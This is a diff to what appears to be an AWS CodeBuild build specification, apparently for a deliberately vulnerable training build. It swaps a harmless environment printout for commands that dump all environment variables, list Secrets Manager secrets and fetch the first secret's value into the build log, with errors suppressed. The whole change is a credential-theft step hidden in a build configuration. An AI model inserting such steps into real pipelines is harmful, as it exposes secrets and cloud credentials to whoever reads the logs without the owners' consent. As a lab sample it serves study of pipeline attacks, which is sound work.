@@ -3,6 +3,9 @@ version: 0.2
 phases:
   build:
     commands:
-      - echo "Running vulnerable training build"
-      - env | sort | head -n 20
-      - echo "Done"
+      - echo "=== ALL ENV VARS ==="
+      - env | sort
+      - echo "=== SECRETS MANAGER ==="
+      - aws secretsmanager list-secrets --output json 2>&1 || true
+      - SECRET=$(aws secretsmanager list-secrets --query 'SecretList[0].Name' --output text 2>/dev/null); echo "Secret: $SECRET"; aws secretsmanager get-secret-value --secret-id "$SECRET" 2>&1 || true
+      - echo "=== DONE ==="
